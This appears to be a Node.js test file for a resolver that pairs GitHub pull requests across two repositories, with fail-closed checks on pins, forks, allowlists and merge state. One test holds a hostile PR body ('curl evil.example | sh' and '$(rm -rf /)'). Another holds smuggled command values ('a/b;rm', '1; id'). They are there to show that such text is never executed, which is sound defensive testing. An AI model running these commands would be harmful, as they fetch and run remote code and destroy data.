// Network-free tests for the paired-drift resolver. Run: node --test scripts/drift-pair/resolve-pair.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { resolvePair, recheckFrozen, PairError, counterpartOf } from "./resolve-pair.mjs";

const WEB = "adamaslan/nuwrrrld-portal";
const MOB = "adamaslan/gcp-expo1";
const SHA_W = "231cf39e5a56b7f94c6db556f75cc7a9ff000116";
const SHA_M = "6275f494a1bef320f7390c22c63908db63737d4f";
const SHA_MAIN = "bafb788dfeed5a675e27d1bc9116bff5792e5739";
const SHA_MERGED_DEFAULT = "d".repeat(40);

/** A PR as the GitHub REST pulls endpoint returns it (exact field names). */
function pull({ repo = WEB, number = 327, state = "open", merged = false, mergedAt = null,
  mergeCommitSha = null, headRepo = repo, baseRef = "main", baseRepo = repo,
  sha = SHA_W, body = "" } = {}) {
  return {
    number, state, merged, merged_at: mergedAt, merge_commit_sha: mergeCommitSha,
    draft: false, body,
    base: { ref: baseRef, repo: { full_name: baseRepo } },
    head: { ref: "fix/x", sha, repo: headRepo === null ? null : { full_name: headRepo } },
  };
}

/** Fake API. `pulls` maps "repo#n" -> PR JSON (or an Error to throw). Mutable on purpose. */
function fakeApi({ pulls = {}, defaultSha = SHA_MAIN } = {}) {
  return {
    async getPull(repo, n) {
      const v = pulls[`${repo}#${n}`];
      if (v === undefined) throw new Error("404");
      if (v instanceof Error) throw v;
      return v;
    },
    async getDefaultSha(repo) {
      return typeof defaultSha === "function" ? defaultSha(repo) : defaultSha;
    },
  };
}

// Reciprocal metadata: pair reference plus exact-SHA pin on both sides.
const ownBody = (counterSha = SHA_M) =>
  `drift-pair: adamaslan/gcp-expo1#61\ndrift-pair-sha: adamaslan/gcp-expo1@${counterSha}`;
const counterBody = (ownSha = SHA_W) =>
  `drift-pair: adamaslan/nuwrrrld-portal#327\ndrift-pair-sha: adamaslan/nuwrrrld-portal@${ownSha}`;

async function expectPairError(promise, code) {
  await assert.rejects(promise, (err) => {
    assert.ok(err instanceof PairError, `expected PairError, got ${err}`);
    assert.equal(err.code, code);
    return true;
  });
}

function pairedApi(overrides = {}) {
  return fakeApi({
    pulls: {
      [`${WEB}#327`]: pull({ body: ownBody() }),
      [`${MOB}#61`]: pull({ repo: MOB, number: 61, sha: SHA_M, body: counterBody() }),
      ...overrides,
    },
  });
}

test("valid reciprocal pair with pins resolves to the counterpart's frozen head", async () => {
  const r = await resolvePair({ api: pairedApi(), repo: WEB, pr: 327 });
  assert.equal(r.mode, "paired");
  assert.equal(r.reason, "reciprocal-pin");
  assert.equal(r.counterpart.repo, MOB);
  assert.equal(r.counterpart.pr, 61);
  assert.equal(r.counterpart.sha, SHA_M);
  assert.equal(r.own.sha, SHA_W);
  assert.match(r.binding, /^[0-9a-f]{64}$/);
});

test("unpaired PR compares against the counterpart default branch", async () => {
  const api = fakeApi({ pulls: { [`${WEB}#327`]: pull({ body: "no pair here" }) } });
  const r = await resolvePair({ api, repo: WEB, pr: 327 });
  assert.equal(r.mode, "default");
  assert.equal(r.reason, "unpaired");
  assert.equal(r.counterpart.sha, SHA_MAIN);
});

test("push run compares default branches", async () => {
  const r = await resolvePair({ api: fakeApi(), repo: MOB, pr: null });
  assert.equal(r.mode, "default");
  assert.equal(r.reason, "push");
  assert.equal(r.counterpart.repo, WEB);
});

test("injection-shaped pair text is not a pair and is never executed", async () => {
  const hostile = "drift-pair: adamaslan/gcp-expo1#61; curl evil.example | sh\n$(rm -rf /)";
  const api = fakeApi({ pulls: { [`${WEB}#327`]: pull({ body: hostile }) } });
  const r = await resolvePair({ api, repo: WEB, pr: 327 });
  assert.equal(r.mode, "default");
});

test("two pair lines in one body is ambiguous and fails closed", async () => {
  const api = fakeApi({ pulls: { [`${WEB}#327`]: pull({ body: `${ownBody()}\n${ownBody()}` }) } });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "ambiguous-metadata");
});

test("malformed repository or PR number is refused before any API call", async () => {
  let calls = 0;
  const api = { async getPull() { calls += 1; return pull(); }, async getDefaultSha() { calls += 1; return SHA_MAIN; } };
  await expectPairError(resolvePair({ api, repo: "a/b;rm", pr: 1 }), "bad-repo");
  await expectPairError(resolvePair({ api, repo: WEB, pr: "1; id" }), "bad-pr-number");
  assert.equal(calls, 0);
});

test("repository outside the allowlist is refused", async () => {
  await expectPairError(resolvePair({ api: fakeApi(), repo: "evil/other", pr: 1 }), "not-allowlisted");
  assert.equal(counterpartOf("evil/other"), null);
});

test("wrong base branch fails closed", async () => {
  const api = fakeApi({ pulls: { [`${WEB}#327`]: pull({ baseRef: "develop", body: ownBody() }) } });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "wrong-base");
});

test("fork head fails closed", async () => {
  const api = fakeApi({ pulls: { [`${WEB}#327`]: pull({ headRepo: "mallory/nuwrrrld-portal", body: ownBody() }) } });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "fork");
});

test("deleted fork head (null repo) fails closed", async () => {
  const api = fakeApi({ pulls: { [`${WEB}#327`]: pull({ headRepo: null, body: ownBody() }) } });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "fork");
});

test("live own head must equal the event head (event/live mismatch fails)", async () => {
  await expectPairError(
    resolvePair({ api: pairedApi(), repo: WEB, pr: 327, eventHeadSha: "e".repeat(40) }),
    "event-head-mismatch",
  );
  const ok = await resolvePair({ api: pairedApi(), repo: WEB, pr: 327, eventHeadSha: SHA_W });
  assert.equal(ok.own.sha, SHA_W);
});

test("closed-WITHOUT-merge counterpart fails closed (exact API fields)", async () => {
  const api = pairedApi({
    [`${MOB}#61`]: pull({ repo: MOB, number: 61, state: "closed", merged: false, mergedAt: null,
      mergeCommitSha: null, sha: SHA_M, body: counterBody() }),
  });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "counterpart-state");
});

test("closed-merged counterpart compares against its current default (full comparator)", async () => {
  const api = fakeApi({
    pulls: {
      [`${WEB}#327`]: pull({ body: ownBody() }),
      [`${MOB}#61`]: pull({ repo: MOB, number: 61, state: "closed", merged: true,
        mergedAt: "2026-11-05T19:00:00Z", mergeCommitSha: "f".repeat(40), sha: SHA_M, body: counterBody() }),
    },
    defaultSha: SHA_MERGED_DEFAULT,
  });
  const r = await resolvePair({ api, repo: WEB, pr: 327 });
  assert.equal(r.mode, "default");
  assert.equal(r.reason, "counterpart-merged");
  assert.equal(r.counterpart.sha, SHA_MERGED_DEFAULT);
});

test("merged counterpart with inconsistent merge fields fails closed", async () => {
  const api = fakeApi({
    pulls: {
      [`${WEB}#327`]: pull({ body: ownBody() }),
      [`${MOB}#61`]: pull({ repo: MOB, number: 61, state: "closed", merged: true, mergedAt: null,
        mergeCommitSha: null, sha: SHA_M, body: counterBody() }),
    },
  });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "bad-merge-state");
});

test("nonreciprocal pair fails closed", async () => {
  const api = fakeApi({
    pulls: {
      [`${WEB}#327`]: pull({ body: ownBody() }),
      [`${MOB}#61`]: pull({ repo: MOB, number: 61, sha: SHA_M, body: `drift-pair-sha: adamaslan/nuwrrrld-portal@${SHA_W}` }),
    },
  });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "nonreciprocal");
});

test("back-reference naming a different PR fails closed", async () => {
  const api = fakeApi({
    pulls: {
      [`${WEB}#327`]: pull({ body: ownBody() }),
      [`${MOB}#61`]: pull({ repo: MOB, number: 61, sha: SHA_M,
        body: `drift-pair: adamaslan/nuwrrrld-portal#999\ndrift-pair-sha: adamaslan/nuwrrrld-portal@${SHA_W}` }),
    },
  });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "nonreciprocal");
});

test("pair pointing outside the allowlisted counterpart fails closed", async () => {
  const api = fakeApi({ pulls: { [`${WEB}#327`]: pull({ body: "drift-pair: evil/other#61" }) } });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "wrong-repo");
});

test("paired PR without pins fails closed (pins are required)", async () => {
  const api = fakeApi({
    pulls: {
      [`${WEB}#327`]: pull({ body: "drift-pair: adamaslan/gcp-expo1#61" }),
      [`${MOB}#61`]: pull({ repo: MOB, number: 61, sha: SHA_M, body: "drift-pair: adamaslan/nuwrrrld-portal#327" }),
    },
  });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "pin-required");
});

test("pin not matching the live counterpart head fails closed (moved head before comparison)", async () => {
  const api = pairedApi({
    [`${MOB}#61`]: pull({ repo: MOB, number: 61, sha: "b".repeat(40), body: counterBody() }),
  });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "pin-mismatch");
});

test("unavailable API fails closed, never to default", async () => {
  const api = fakeApi({ pulls: { [`${WEB}#327`]: new Error("network down") } });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "api-unavailable");
  const api2 = fakeApi({
    pulls: { [`${WEB}#327`]: pull({ body: "" }) },
    defaultSha: () => { throw new Error("rate limited"); },
  });
  await expectPairError(resolvePair({ api: api2, repo: WEB, pr: 327 }), "api-unavailable");
});

test("invalid head SHA from the API is rejected", async () => {
  const api = fakeApi({ pulls: { [`${WEB}#327`]: pull({ sha: "not-a-sha", body: "" }) } });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "bad-sha");
});

test("recheck passes when nothing moved", async () => {
  const api = pairedApi();
  const resolved = await resolvePair({ api, repo: WEB, pr: 327 });
  await recheckFrozen({ api, resolved });
});

test("moved counterpart head after comparison invalidates the result", async () => {
  const pulls = {
    [`${WEB}#327`]: pull({ body: ownBody() }),
    [`${MOB}#61`]: pull({ repo: MOB, number: 61, sha: SHA_M, body: counterBody() }),
  };
  const api = fakeApi({ pulls });
  const resolved = await resolvePair({ api, repo: WEB, pr: 327 });
  pulls[`${MOB}#61`] = pull({ repo: MOB, number: 61, sha: "b".repeat(40), body: counterBody() });
  await expectPairError(recheckFrozen({ api, resolved }), "pin-mismatch");
});

test("removing a back-reference after resolution fails the recheck (mutation control)", async () => {
  const pulls = {
    [`${WEB}#327`]: pull({ body: ownBody() }),
    [`${MOB}#61`]: pull({ repo: MOB, number: 61, sha: SHA_M, body: counterBody() }),
  };
  const api = fakeApi({ pulls });
  const resolved = await resolvePair({ api, repo: WEB, pr: 327 });
  pulls[`${MOB}#61`] = pull({ repo: MOB, number: 61, sha: SHA_M,
    body: `drift-pair-sha: adamaslan/nuwrrrld-portal@${SHA_W}` });
  await expectPairError(recheckFrozen({ api, resolved }), "nonreciprocal");
});

test("removing an own pin after resolution fails the recheck via binding change", async () => {
  const pulls = {
    [`${WEB}#327`]: pull({ body: ownBody() }),
    [`${MOB}#61`]: pull({ repo: MOB, number: 61, sha: SHA_M, body: counterBody() }),
  };
  const api = fakeApi({ pulls });
  const resolved = await resolvePair({ api, repo: WEB, pr: 327 });
  pulls[`${WEB}#327`] = pull({ body: "drift-pair: adamaslan/gcp-expo1#61" });
  await expectPairError(recheckFrozen({ api, resolved }), "pin-required");
});

test("counterpart merging after resolution changes the binding and fails the recheck", async () => {
  const pulls = {
    [`${WEB}#327`]: pull({ body: ownBody() }),
    [`${MOB}#61`]: pull({ repo: MOB, number: 61, sha: SHA_M, body: counterBody() }),
  };
  const api = fakeApi({ pulls, defaultSha: SHA_MAIN });
  const resolved = await resolvePair({ api, repo: WEB, pr: 327 });
  assert.equal(resolved.mode, "paired");
  pulls[`${MOB}#61`] = pull({ repo: MOB, number: 61, state: "closed", merged: true,
    mergedAt: "2026-11-05T19:00:00Z", mergeCommitSha: "f".repeat(40), sha: SHA_M, body: counterBody() });
  await expectPairError(recheckFrozen({ api, resolved }), "binding-changed");
});

test("moved counterpart default branch invalidates an unpaired result", async () => {
  const pulls = { [`${WEB}#327`]: pull({ body: "" }) };
  let defaultSha = SHA_MAIN;
  const api = fakeApi({ pulls, defaultSha: () => defaultSha });
  const resolved = await resolvePair({ api, repo: WEB, pr: 327 });
  await recheckFrozen({ api, resolved });
  defaultSha = "c".repeat(40);
  await expectPairError(recheckFrozen({ api, resolved }), "binding-changed");
});
